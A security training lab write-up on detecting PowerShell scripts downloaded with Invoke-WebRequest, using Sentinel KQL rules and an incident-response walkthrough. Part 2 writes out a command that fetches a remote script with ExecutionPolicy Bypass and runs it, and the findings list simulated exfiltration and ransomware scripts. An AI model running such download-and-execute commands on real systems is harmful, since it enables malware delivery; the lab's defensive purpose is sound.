# PowerShell Suspicious Web Request Detection Lab

## Lab Purpose
Simulate, detect, investigate, and respond to malicious PowerShell activity involving remote script downloads using Microsoft Defender for Endpoint and Microsoft Sentinel.

---

## Explanation
Attackers often use legitimate tools like PowerShell to download and run malicious scripts. This allows them to bypass traditional defenses and blend into normal system activity. Detecting these actions is critical for identifying post-exploitation behaviors.

---

## Part 1: Create Alert Rule in Microsoft Sentinel

### **KQL Query:**
```kql
let TargetHostname = "windows-target-1";
DeviceProcessEvents
| where DeviceName == TargetHostname
| where FileName == "powershell.exe"
| where InitiatingProcessCommandLine contains "Invoke-WebRequest"
| order by TimeGenerated
```

### **Analytics Rule Settings:**
- **Name:** PowerShell Suspicious Web Request
- **Description:** Detects when PowerShell is used to download a file using Invoke-WebRequest.
- **Rule Enabled:** Yes
- **Schedule:** Every 4 hours
- **Lookup Data Range:** Last 24 hours
- **Stop query after alert is generated:** Yes
- **Entity Mappings:**
  - **Account**: Name = AccountName
  - **Host**: Name = DeviceName
  - **Process**: CommandLine = ProcessCommandLine
- **Incident Creation:** Automatically create incident and group all alerts into a single incident per 24 hours

---

## Part 2: Trigger the Alert
Run the following PowerShell commands on your VM to simulate malicious behavior:
```powershell
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1' -OutFile 'C:\programdata\eicar.ps1';
powershell.exe -ExecutionPolicy Bypass -File 'C:\programdata\eicar.ps1';
```

---

## Part 3: Work the Incident

### **Detection and Analysis**
- Incident triggered on: `windows-target-1`
- User reported a black screen at the time of activity.
- Confirmed PowerShell ran the following download commands:

```powershell
Invoke-WebRequest -Uri <URL> -OutFile C:\programdata\<script>.ps1
```

Scripts Downloaded:
1. `portscan.ps1`
2. `eicar.ps1`
3. `exfiltratedata.ps1`
4. `pwncrypt.ps1`

### **Execution Check**
Use the query below to confirm script execution:
```kql
let TargetHostname = "windows-target-1";
let ScriptNames = dynamic(["eicar.ps1", "exfiltratedata.ps1", "portscan.ps1", "pwncrypt.ps1"]);
DeviceProcessEvents
| where DeviceName == TargetHostname
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "-File" and ProcessCommandLine has_any (ScriptNames)
| order by TimeGenerated
| project TimeGenerated, AccountName, DeviceName, FileName, ProcessCommandLine
```

### **Script Analysis Findings**
1. **portscan.ps1** - Scans local IP range for open ports.
2. **eicar.ps1** - Creates EICAR test file to simulate antivirus detection.
3. **exfiltratedata.ps1** - Creates fake data and uploads it to Azure blob storage.
4. **pwncrypt.ps1** - Creates and encrypts fake company files, drops ransom note.

### **Containment and Eradication**
- Isolated VM using Microsoft Defender for Endpoint
- Performed full malware scan (came back clean)

### **Post-Incident Actions**
- User completed cybersecurity training
- Upgraded KnowBe4 training and increased frequency
- Implemented policy restricting PowerShell for non-essential users

---

## Part 4: Cleanup
- In Sentinel → Threat Management → Incidents, delete your **closed** incident
- In Sentinel → Configuration → Analytics, delete your **custom** rule

**Important:** Only delete your own content. Use your name to filter if needed.

